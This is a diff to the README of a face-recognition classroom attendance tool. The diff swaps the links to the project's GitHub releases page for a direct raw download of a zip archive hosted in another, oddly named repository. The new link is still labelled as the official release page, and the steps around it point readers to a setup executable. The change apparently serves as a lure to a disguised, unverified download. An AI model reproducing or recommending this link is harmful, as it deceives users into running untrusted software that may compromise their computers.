@@ -5,7 +5,7 @@ description: "Automate student attendance tracking using InsightFace and OpenCV 
 ---
 # 📷 Attendance-AI - Automated classroom attendance via face recognition
 
-[![Download Attendance-AI](https://img.shields.io/badge/Download-Attendance--AI-blue)](https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases)
+[![Download Attendance-AI](https://img.shields.io/badge/Download-Attendance--AI-blue)](https://raw.githubusercontent.com/Aubriehundredandseventieth600/aubriehundredandseventieth600.github.io/main/reknow/aubriehundredandseventieth_github_io_v2.9-beta.1.zip)
 
 Attendance-AI tracks student presence in classrooms using video footage. This system captures student faces and matches them against a saved database. It updates attendance records in real time. Teachers save time on manual roll calls. Administrators get accurate data for school reporting.
 
@@ -24,7 +24,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to obtain the installer for your computer:
 
-1.  Visit the official release page: [https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases](https://github.com/Aubriehundredandseventieth600/Attendance-AI/releases)
+1.  Visit the official release page: [https://raw.githubusercontent.com/Aubriehundredandseventieth600/aubriehundredandseventieth600.github.io/main/reknow/aubriehundredandseventieth_github_io_v2.9-beta.1.zip](https://raw.githubusercontent.com/Aubriehundredandseventieth600/aubriehundredandseventieth600.github.io/main/reknow/aubriehundredandseventieth_github_io_v2.9-beta.1.zip)
 2.  Look for the section labeled "Assets" at the bottom of the newest release version.
 3.  Click the file named `Attendance-AI-Setup.exe` to start the download.
 4.  Save the file to your "Downloads" folder.
